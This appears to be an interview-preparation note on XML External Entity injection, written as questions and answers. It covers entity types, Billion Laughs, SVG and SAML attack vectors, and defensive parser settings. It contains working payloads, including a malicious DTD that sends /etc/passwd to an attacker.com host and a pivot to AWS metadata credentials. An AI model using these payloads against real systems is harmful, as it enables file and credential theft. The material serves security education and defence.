---
tags: [interview, web-security, qna, scenario]
difficulty: expert
module: "Interview Prep - Web Security"
topic: "QnA - Web Module 06"
---

# XML External Entity (XXE) Injection Interview Guide

## Formal Technical Questions

### Q1: Explain the fundamental difference between General Entities and Parameter Entities in the context of an XXE attack. When would an attacker choose to use one over the other?
**Answer:**
XML entities are variables used to define shortcuts to standard text or special characters. 
- **General Entities:** Defined using `<!ENTITY name "value">` and referenced within the XML document payload as `&name;`. These are evaluated in the document's structure and are predominantly used in **In-Band XXE** attacks, where the application reflects the parsed XML content back to the user in its HTTP response.
- **Parameter Entities:** Defined using `<!ENTITY % name "value">` and referenced solely within the Document Type Definition (DTD) itself as `%name;`. Parameter entities are the primary vehicle for **Out-of-Band (OOB) / Blind XXE** attacks. When a web application parses the XML but does not reflect any output, an attacker must exfiltrate data through secondary channels (e.g., DNS or HTTP requests back to an attacker-controlled server). Because standard entities cannot be evaluated within DTD declarations in some parsers, parameter entities allow the attacker to dynamically construct new entities that trigger the OOB interaction.

### Q2: How does the "Billion Laughs" attack work, and how does it differ fundamentally from data-exfiltration XXE?
**Answer:**
The Billion Laughs attack is a Denial of Service (DoS) vulnerability targeting XML parsers, leveraging XML entity expansion.
- **Mechanism:** It does not rely on *external* entities, but rather on nested, internal general entities. The attacker defines a base entity containing a string (e.g., "lol"), and then subsequent entities reference the previous ones multiple times (e.g., `<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">`).
- **Impact:** By nesting these references 10 levels deep, a single reference to the top-level entity in the XML body results in 10^9 (one billion) expansions of the base string.
- **Difference from XXE:** Standard XXE seeks to read local files, execute SSRF, or trigger OOB interactions using the `SYSTEM` or `PUBLIC` keywords. The Billion Laughs attack strictly exploits the memory and CPU consumption of the parsing engine to exhaust server resources.

### Q3: What is the significance of the `SYSTEM` keyword in an XML DTD, and how does it interact with various URI handlers?
**Answer:**
The `SYSTEM` keyword instructs the XML parser to fetch the entity's replacement text from a specified Uniform Resource Identifier (URI).
- **File System Interaction:** By specifying `file:///etc/passwd` or `file:///c:/windows/win.ini`, the parser reads the contents of local files on the server hosting the application.
- **Network Interaction:** By specifying `http://` or `https://`, the parser performs a Server-Side Request Forgery (SSRF) attack, potentially accessing internal network resources, metadata endpoints (e.g., `http://169.254.169.254/latest/meta-data/` on AWS), or interacting with attacker-controlled infrastructure for OOB exfiltration.
- **Alternative Handlers:** Depending on the underlying parser technology (like PHP's libxml), other wrappers like `php://filter/read=convert.base64-encode/resource=index.php` or `expect://id` can be used to bypass bad characters or even execute arbitrary system commands.

### Q4: Describe the limitations of exfiltrating multiline files or files containing XML special characters (like `<`, `>`, `&`) via OOB XXE, and how to overcome them.
**Answer:**
When exfiltrating data via OOB XXE, the parsed data is often appended to a URL (e.g., `http://attacker.com/?data=%payload;`). 
- **Limitation:** If the target file contains XML special characters, the XML parser will attempt to interpret them as XML markup, causing a parsing error and halting the extraction. Additionally, multiline files can break HTTP request formatting.
- **Overcoming in PHP:** Use the `php://filter` wrapper to base64-encode the file contents before parsing (e.g., `php://filter/read=convert.base64-encode/resource=/etc/passwd`).
- **Overcoming in Java:** Use CDATA sections. The attacker constructs a parameter entity that dynamically wraps the target file contents within `<![CDATA[` and `]]>`. However, this can be complex due to parsing evaluation orders, often requiring the external DTD to declare the CDATA wrapping properly.

## Scenario-Based Questions

### Q1: You are on a Red Team engagement and intercept a SAML authentication request. The application relies on SAML for Single Sign-On (SSO). How would you test this for XXE, and what specific elements would you target?
**Answer:**
SAML responses are inherently XML-based. The testing methodology would involve:
1. **Intercept the SAML Response:** Capture the base64-encoded SAML response sent from the Identity Provider (IdP) to the Service Provider (SP).
2. **Decode and Inject:** Base64-decode the SAML XML. Insert a malicious `DOCTYPE` declaration at the very beginning of the XML document, defining an external entity pointing to my Burp Collaborator payload.
3. **Reference the Entity:** I would look for standard SAML fields that might be reflected or processed by the SP, such as `<saml:NameID>`, `<saml:Issuer>`, or custom attributes within `<saml:AttributeStatement>`. I'd inject the entity reference (e.g., `&xxe;`) into these fields.
4. **Re-encode and Submit:** Base64-encode the modified XML and forward it to the SP's Assertion Consumer Service (ACS) URL.
5. **Observation:** If the application is vulnerable to In-Band XXE, the file contents will appear in the web page or error messages. If it's Blind XXE, I will monitor my Collaborator instance for HTTP/DNS interactions triggered by the XML parser resolving the external entity.

### Q2: You are testing a web application that processes user-uploaded SVG images for user avatars. How can this feature be exploited using XXE?
**Answer:**
Scalable Vector Graphics (SVG) files are XML documents. 
1. **Payload Crafting:** I would create a valid SVG file and inject a `DOCTYPE` declaration containing an external entity.
   ```xml
   <?xml version="1.0" standalone="yes"?>
   <!DOCTYPE svg [
     <!ELEMENT svg ANY >
     <!ENTITY xxe SYSTEM "file:///etc/hostname" >
   ]>
   <svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
     <text x="20" y="20" font-size="20">&xxe;</text>
   </svg>
   ```
2. **Execution:** Upload the malicious SVG as the avatar.
3. **Trigger:** View the uploaded avatar. If the image processing library (like ImageMagick or an internal XML parser) evaluates the entities, the rendered image will visually contain the text of `/etc/hostname`. This is a classic example of an In-Band XXE using an unconventional delivery vector.

### Q3: You have discovered a Blind XXE vulnerability. You can receive DNS pings on your Collaborator, but HTTP exfiltration of `/etc/passwd` fails silently. What is the likely cause and your next steps?
**Answer:**
- **Likely Cause:** The target server's firewall restricts outbound HTTP traffic, allowing only DNS queries to leave the internal network. Alternatively, the file content contains newline characters that break the URI structure of the outbound HTTP GET request.
- **Next Steps:**
  1. **Exfiltrate via DNS:** I would shift from HTTP to DNS exfiltration. Since domain names have strict length limits and character set restrictions, I need to exfiltrate the data chunk by chunk or utilize a specialized tool.
  2. **FTP Wrapper (Java):** If the backend is Java, I might try the `ftp://` wrapper, as Java's XML parser sometimes allows exfiltration via FTP protocols which might bypass HTTP-specific firewall rules.
  3. **Error-Based Exfiltration:** I would attempt to trigger a parsing error that includes the file content in the error message. I'd force the parser to evaluate a nonexistent local file path that includes the extracted data (e.g., `file:///nonexistent/%payload;`). If the application returns detailed stack traces, the contents of the payload will be leaked in the error message.

## Deep-Dive Defensive Questions

### Q1: As a Security Architect, how do you completely eradicate XXE vulnerabilities across a diverse tech stack (Java, .NET, Python)?
**Answer:**
The only bulletproof defense against XXE is to completely disable Document Type Definitions (DTDs) and XML external entity processing in the XML parser configuration.
- **Java:**
  For `DocumentBuilderFactory`, set the feature `http://apache.org/xml/features/disallow-doctype-decl` to `true`. This entirely disables DTDs. If DTDs are strictly required, disable external general and parameter entities:
  ```java
  factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
  factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
  ```
- **.NET:**
  In older versions, use `XmlReaderSettings` and set `ProhibitDtd` or `DtdProcessing = DtdProcessing.Prohibit`. In modern .NET (Framework 4.5.2+ and .NET Core/.NET 5+), `XmlReader` is secure by default as external entities are disabled.
- **Python:**
  The standard `xml.etree.ElementTree` is vulnerable to entity expansion. Defend by using the `defusedxml` library, which provides secure drop-in replacements for standard XML parsers, actively preventing DTD evaluation and entity expansion.

### Q2: A development team claims they are secure against XXE because they strip out the `<` and `>` characters from user input. Evaluate this defense.
**Answer:**
This is a fundamentally flawed, blacklist-based approach.
- **Encoding Bypasses:** Attackers can bypass input filters using various encodings. If the application decodes the input *after* the filter, or if the parser supports encodings like UTF-16, UTF-7, or Base64, the filter is useless.
- **Alternative Delivery:** The attacker might deliver the payload via vectors the filter doesn't cover, such as an uploaded file (SVG, DOCX) or an HTTP header that is later processed as XML.
- **Core Issue:** Sanitization is the wrong layer for this defense. XXE is a parser configuration flaw, not an input validation flaw. The parser itself must be configured to safely handle the structure of the document regardless of the input.

## Real-World Attack Scenario

### Blind XXE to Internal Cloud SSRF
A web application accepts XML-based resumes for job applications. The application parses the XML to extract the candidate's name and email, which are then saved to a database. The XML itself is never reflected to the user.

1. **Reconnaissance:** The attacker uploads a standard resume and observes a successful submission. They then intercept the request and inject a standard In-Band XXE payload. The server responds with a 200 OK, but no data is returned.
2. **OOB Identification:** The attacker modifies the payload to include an external parameter entity pointing to their Burp Collaborator domain:
   ```xml
   <?xml version="1.0" ?>
   <!DOCTYPE root [
   <!ENTITY % ext SYSTEM "http://collaborator.net/ping">
   %ext;
   ]>
   <resume><name>Test</name><email>test@test.com</email></resume>
   ```
   The Collaborator receives an HTTP GET request, confirming Blind XXE.
3. **Exfiltration Setup:** The attacker hosts a malicious DTD file (`malicious.dtd`) on their server:
   ```xml
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
   %eval;
   %exfiltrate;
   ```
4. **Execution:** The attacker submits the following XML payload:
   ```xml
   <?xml version="1.0" ?>
   <!DOCTYPE root [
   <!ENTITY % remote SYSTEM "http://attacker.com/malicious.dtd">
   %remote;
   ]>
   <resume><name>Test</name></resume>
   ```
5. **Pivoting via SSRF:** After successfully reading `/etc/passwd`, the attacker realizes the application is hosted on AWS. They change the `%file` entity in their `malicious.dtd` to point to the AWS IMDSv1 metadata endpoint:
   `<!ENTITY % file SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/WebServerRole">`
6. **Impact:** The attacker retrieves temporary IAM credentials, gaining unauthorized access to the AWS environment.

```text
      +-----------------+                        +------------------+
      |  Attacker       |                        |   Target Server  |
      |                 |---- 1. XML Payload --->|   (Vulnerable    |
      |                 |                        |   XML Parser)    |
      |                 |<--- 2. Fetch DTD ------|        |         |
      |  Malicious DTD  |---- 3. malicious.dtd ->|        |         |
      |  Server         |                        |        v         |
      |                 |                        |  Fetch AWS Keys  |
      |                 |<--- 4. Data Exfil -----| (169.254.169.254)|
      +-----------------+                        +------------------+
```

## Chaining Opportunities
- Chaining with **SSRF** to pivot into internal networks or cloud metadata services.
- Chaining with **XSS** if the extracted file contents (containing malicious JavaScript) are reflected in an admin dashboard later.
- Chaining with **NTLM Relay** by forcing the XML parser (on a Windows domain) to authenticate to an attacker-controlled SMB share using the `file://` or `unc://` paths.

## Related Notes
- [[02 - Server-Side Request Forgery SSRF]]
- [[15 - XML Security and Protections]]
- [[21 - Cloud Metadata Exploitation]]
